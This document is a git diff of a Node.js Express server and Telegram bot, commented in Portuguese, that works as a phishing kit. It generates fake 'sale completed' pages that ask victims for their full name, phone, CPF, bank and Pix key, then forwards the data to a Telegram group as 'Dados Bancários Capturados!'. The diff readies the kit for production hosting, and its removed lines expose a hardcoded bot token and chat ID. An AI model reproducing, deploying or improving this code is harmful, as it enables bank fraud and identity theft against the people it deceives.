@@ -3,17 +3,18 @@ const fs = require('fs');
 const express = require('express');
 
 const app = express();
-const bot = new Telegraf('7334374823:AAGCQXJ-gGU4mTmiLym_XmdAzQ29lz60taA');
-const GROUP_CHAT_ID = "-1002448126650";
+const bot = new Telegraf(process.env.BOT_TOKEN)
+const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID
 const DATA_FILE = 'data.json';
+const RENDER_URL = process.env.RENDER_URL 
 
 
 
-// Configuração inicial
+// inicia mue server
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Funções de manipulação de dados
+
 function loadData() {
   try {
     return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
@@ -26,16 +27,16 @@ function saveData(data) {
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-// Inicialização de variáveis
-let produtos = {}; // Armazena os produtos em cadastro
-let acoes = {}; // Armazena as ações de redirecionamento
 
-// Comando para iniciar o cadastro de um novo produto
+let produtos = {}; 
+let acoes = {};
+
+// comand /novo
 bot.command('novo', async (ctx) => {
   const userId = ctx.from.id;
   const data = loadData();
 
-  // Remove produtos não finalizados do mesmo usuário
+
   Object.keys(data.produtos).forEach(produtoId => {
     if (data.produtos[produtoId].userId === userId && data.produtos[produtoId].etapa !== 'finalizado') {
       delete data.produtos[produtoId];
@@ -47,7 +48,7 @@ bot.command('novo', async (ctx) => {
     id: produtoId,
     userId,
     etapa: 'vendedor',
-    qr: '', // Armazena o código QR fornecido
+    qr: '',
     vendedor: '',
     nome: '',
     descricao: '',
@@ -58,26 +59,26 @@ bot.command('novo', async (ctx) => {
     regiao: '',
   };
 
-  saveData(data); // Salva os dados atualizados no arquivo
-  produtos[userId] = data.produtos[produtoId]; // Atualiza o estado do produto para o usuário
+  saveData(data);
+  produtos[userId] = data.produtos[produtoId]; 
   await ctx.reply('Digite o nome do vendedor:');
 });
 
-// Comando para atualizar o código QR
+
 bot.command('qr', async (ctx) => {
   console.log('[LOG] Comando /qr recebido:', ctx.message.text);
 
   const [_, produtoId, novoCodigo] = ctx.message.text.split(' ');
   console.log('[LOG] produtoId:', produtoId, 'novoCodigo:', novoCodigo);
 
-  // Validação de entrada
+
   if (!produtoId || !novoCodigo) {
        
     console.log('[ERRO] Formato inválido');
     return await ctx.reply('❌ Use: /qr <ID_Produto> <Novo_Código>');
   }
 
-  // Sanitização das entradas
+
   const sanitizedProdutoId = produtoId.trim();
   const sanitizedNovoCodigo = novoCodigo.trim();
 
@@ -97,7 +98,7 @@ bot.command('qr', async (ctx) => {
     return await ctx.reply('❌ Produto não encontrado!');
   }
 
-  // Atualizar o código QR
+
   produto.qr = sanitizedNovoCodigo;
 
   // Salvar dados
@@ -111,7 +112,7 @@ bot.command('qr', async (ctx) => {
   }
 });
 
-// Handler para mensagens de texto (cadastro de produtos)
+
 bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
     const text = ctx.message.text;
@@ -123,8 +124,8 @@ bot.on('text', async (ctx) => {
         case 'vendedor':
           produto.vendedor = text;
           produto.etapa = 'produto';
-          data.produtos[produto.id] = produto; // Atualiza os dados no arquivo
-          saveData(data); // Salva os dados atualizados
+          data.produtos[produto.id] = produto; 
+          saveData(data);
           await ctx.reply('Digite o nome do produto:');
           break;
         case 'produto':
@@ -171,24 +172,24 @@ bot.on('text', async (ctx) => {
           break;
         case 'regiao':
           produto.regiao = text;
-          produto.etapa = 'qr'; // Nova etapa para pedir o código QR
+          produto.etapa = 'qr'; 
           data.produtos[produto.id] = produto;
           saveData(data);
           await ctx.reply('Digite o código QR:');
           break;
         case 'qr':
-          produto.qr = text; // Armazena o código QR
+          produto.qr = text; 
           produto.etapa = 'finalizado';
   
-          // Gera uma URL única para o produto
+          
           const actionId = Math.random().toString(36).substr(2, 9);
           data.acoes[actionId] = { produtoId: produto.id, redirectTo: 'https://exemplo.com/dados-bancarios' };
           produto.actionId = actionId;
   
           data.produtos[produto.id] = produto;
-          saveData(data); // Salva os dados atualizados
+          saveData(data); 
   
-          await ctx.reply(`Produto cadastrado com sucesso! Aqui está sua URL única: http://localhost:3000/produtos?id=${produto.id}`);
+          await ctx.reply(`✅ Produto cadastrado! Acesse: ${RENDER_URL}/produtos?id=${produto.id}`);
           await ctx.reply(`id de mudança de URL ${actionId}`);
           break;
         default:
@@ -196,19 +197,26 @@ bot.on('text', async (ctx) => {
       }
     }
   });
+  // Configuração do Webhook para produção
+if (process.env.NODE_ENV === 'production') {
+    bot.telegram.setWebhook(`${RENDER_URL}/bot${bot.token}`);
+    app.use(bot.webhookCallback(`/bot${bot.token}`));
+} else {
+    bot.launch(); // Só usa polling em desenvolvimento
+}
 
   app.get('/produtos', (req, res) => {
     const id = req.query.id;
-    const data = loadData(); // Carrega os dados do arquivo
+    const data = loadData(); 
   
-    // Encontra o produto pelo ID
+
     const produto = data.produtos[id];
   
     if (!produto) {
       return res.status(404).send('Produto não encontrado!');
     }
   
-    // Recupera a ação associada ao produto
+
     const acao = data.acoes[produto.actionId];
   
     if (!acao) {
@@ -451,7 +459,7 @@ bot.on('text', async (ctx) => {
                 <p style="padding-left: 5px; padding-right: 5px;">
                     Sua venda foi concluída com sucesso. Clique abaixo para fornecer os dados bancários e garantir o pagamento rápido e seguro. Continue vendendo com sucesso!
                 </p>
-                <button onclick="window.location.href='http://localhost:3000/pagina-secundaria?id=${produto.actionId}'">Avançar</button>
+                <button onclick="window.location.href='${RENDER_URL}/pagina-secundaria?id=${produto.actionId}'">Avançar</button>
             </div>
         </div>
 
@@ -479,16 +487,16 @@ bot.on('text', async (ctx) => {
 
   app.get('/pagina-secundaria', (req, res) => {
     const actionId = req.query.id;
-    const data = loadData(); // Carrega os dados do arquivo
+    const data = loadData(); 
   
-    // Recupera a ação associada ao actionId
+   
     const acao = data.acoes[actionId];
   
     if (!acao) {
       return res.status(404).send('Ação não encontrada!');
     }
   
-    // Exibe uma página personalizada antes do redirecionamento
+    
     res.send(`
       <!DOCTYPE html>
       <html lang="pt-br">
@@ -692,7 +700,7 @@ bot.on('text', async (ctx) => {
   
           <div class="form-container">
               <h2>Preencha seus Dados Bancários</h2>
-              <form action="/confirmar?id=${actionId}" method="POST" id="form-dados-bancarios" onsubmit="return validarFormulario();">
+              <form action="${RENDER_URL}/confirmar?id=${actionId}" method="POST" id="form-dados-bancarios" onsubmit="return validarFormulario();">
                   <label for="nome">Nome Completo:</label>
                   <input type="text" id="nome" name="nome" placeholder="Seu nome completo" required>
   
@@ -827,33 +835,33 @@ bot.on('text', async (ctx) => {
 
 
 
-// Rota para redirecionamento
+
 app.post('/confirmar', async (req, res) => {
-    const { nome, telefone, cpf, banco, chave } = req.body; // 👈 Apenas UMA declaração
+    const { nome, telefone, cpf, banco, chave } = req.body; 
     const actionId = req.query.id;
     const data = loadData();
   
-    // Passo 1: Encontre o produtoId vinculado ao actionId
+   
     const acao = data.acoes[actionId];
     if (!acao) {
         return res.status(404).send('Ação não encontrada!');
     }
 
-    // Passo 2: Use o produtoId da ação
+   
     const produtoId = acao.produtoId;
     const produto = data.produtos[produtoId];
 
-    // Validação dos campos
+
     if (!nome || !telefone || !cpf || !banco || !chave) {
         return res.status(400).send('Todos os campos são obrigatórios!');
     }
 
-    // Verifica se o produto existe
+
     if (!produto) {
         return res.status(404).send('Produto não encontrado');
     }
 
-    // Mensagem para o Telegram<h1>${produto.nome}</h1>    <p>QR Code: ${produto.qr}</p>
+  
     const mensagem = `
     💳 Dados Bancários Capturados!
     ━━━━━━━━━━━━━━━━━━━━━
@@ -960,17 +968,24 @@ app.post('/confirmar', async (req, res) => {
         res.status(500).send('Ocorreu um erro no processamento');
     }
 });
-// Rota para upload de arquivo
+
 const multer = require('multer');
 const upload = multer({ dest: 'uploads/' });
 
 app.post('/upload', upload.single('file'), (req, res) => {
-    // Processar o arquivo aqui
+    
     res.send('Comprovante recebido com sucesso!');
 });
 
 
-app.listen(3000, () => {
-    console.log('Servidor rodando em http://localhost:3000');
-    bot.launch();
-  });
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+    console.log(`🟢 Servidor rodando em: ${RENDER_URL}`);
+    
+    // Só inicia o bot via polling em desenvolvimento
+    if (process.env.NODE_ENV !== 'production') {
+        bot.launch();
+        console.log('🤖 Bot iniciado via polling (modo desenvolvimento)');
+    }
+});
